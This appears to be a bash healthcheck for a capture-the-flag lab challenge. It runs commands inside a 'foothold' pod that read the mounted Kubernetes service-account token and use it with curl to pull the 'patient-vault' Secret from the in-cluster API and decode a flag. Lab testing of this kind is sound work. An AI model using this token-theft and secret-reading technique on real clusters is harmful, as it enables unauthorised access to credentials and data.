#!/usr/bin/env bash
# i05 healthcheck (needs a live cluster). Solves it the intended way: from inside
# the foothold pod, use the mounted SA token to read the Secret in the records
# namespace via the in-cluster API, and confirm the flag.
set -euo pipefail
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"; load_env

read -r -d '' SOLVE <<'SH' || true
set -e
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://kubernetes.default.svc
S=$(curl -sk -H "Authorization: Bearer $TOKEN" \
     "$API/api/v1/namespaces/records/secrets/patient-vault")
echo "$S" | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 | base64 -d
SH

OUT="$(kubectl -n apps exec patient-worker -- sh -c "$SOLVE" 2>/dev/null || true)"
echo "recovered: $OUT"
echo "$OUT" | grep -qE "${FLAG_PREFIX}\{" && { echo "i05 healthcheck rc=0"; exit 0; }
echo "i05 healthcheck FAILED"; exit 1
